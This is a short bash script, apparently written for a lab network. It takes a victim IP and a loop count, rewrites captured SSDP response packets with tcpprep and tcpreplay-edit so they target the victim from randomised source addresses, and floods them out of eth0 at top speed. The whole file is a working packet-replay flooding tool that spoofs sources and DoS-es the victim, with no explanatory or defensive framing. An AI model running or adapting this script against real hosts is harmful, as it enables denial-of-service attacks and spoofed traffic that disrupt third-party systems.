#!/bin/bash

VICTIM="$1" # Victim IP address
LOOPS="$2"

tcpprep -c 10.0.1.24 -o ssdp.cach -i ssdp-response-short.pcap




while [ $LOOPS -gt 0 ]
do
#IP=$(echo $((RANDOM%254 + 1)))
#   tcprewrite \
#         --endpoints="$VICTIM":"192.168.122.$IP" \
#         --enet-smac=52:54:00:2d:4c:c4,52:54:00:a9:3f:df \
#         --enet-dmac=52:54:00:a9:3f:df,52:54:00:2d:4c:c4 \
#         -c ssdp.cach -i ssdp-replay-packets.pcap \
#         -o ssdp-edit.pcap
#
#
#   tcpreplay \
#       -i eth0 -I eth0 \
#       -c ssdp.cach ssdp-edit.pcap
#
#
     IP=$(echo $((RANDOM%254 + 1)))
     tcpreplay-edit --endpoints="$VICTIM":"192.168.122.$IP" \
     --enet-dmac=52:54:00:a9:3f:df,52:54:00:2d:4c:c4 \
     --enet-smac=52:54:00:2d:4c:c4,52:54:00:a9:3f:df \
     -t -K -i eth0 -I eth0 \
     -c ssdp.cach ssdp-response-short.pcap




    LOOPS=$(( $LOOPS - 1 ))
done
